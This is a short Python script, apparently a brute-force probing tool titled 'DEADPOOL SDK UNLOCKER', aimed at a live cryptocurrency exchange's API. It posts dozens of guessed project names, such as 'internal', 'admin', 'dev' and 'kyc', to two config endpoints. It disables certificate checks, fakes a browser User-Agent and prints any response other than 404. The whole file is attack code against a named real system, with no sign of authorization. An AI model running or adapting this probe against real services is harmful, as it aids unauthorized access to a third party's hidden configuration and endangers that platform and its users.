#!/usr/bin/env python3
import requests
import json

requests.packages.urllib3.disable_warnings()

print("="*80)
print("DEADPOOL SDK UNLOCKER - JSON PAYLOAD BRUTEFORCE")
print("="*80)

BASE_URL = "https://api.bybit.com"
ENDPOINTS = ["/v3/config/web", "/v3/config/banner"]

PROJECTS = [
    "bybit", "web", "app", "pc", "global", "site", 
    "deadpool", "config", "common", "main", "home",
    "trade", "assets", "user", "account", "kyc",
    "marketing", "banner", "cms", "strapi",
    "internal", "admin", "dashboard", "test", "dev",
    "v3", "v5", "api", "spot", "future", "option",
    "unified", "classic", "uta", "vip", "affiliate",
    "referral", "broker", "institutional",
    "launchpad", "launchpool", "earn", "savings",
    "nft", "web3", "wallet", "card", "p2p",
    "fiat", "crypto", "market", "ws", "push",
    "notification", "security", "risk", "compliance"
]

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "platform": "pc",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

for endpoint in ENDPOINTS:
    print(f"\n[Scanning {endpoint}]")
    
    for project in PROJECTS:
        payloads = [
            {"project_name": project},
            {"project": project},
            {"app": project},
            {"site": "global", "project_name": project}
        ]
        
        for payload_inner in payloads:
            final_payload = {
                "data": payload_inner,
                "ttl": 60000
            }
            
            try:
                r = requests.post(
                    f"{BASE_URL}{endpoint}", 
                    json=final_payload,
                    headers=HEADERS,
                    verify=False,
                    timeout=2
                )
                
                if r.status_code != 404:
                    print(f"🔥 FOUND! Payload: {payload_inner} -> Status: {r.status_code}")
                    print(f"   Response: {r.text[:200]}")
                    
            except:
                pass

print("\nScan complete.")
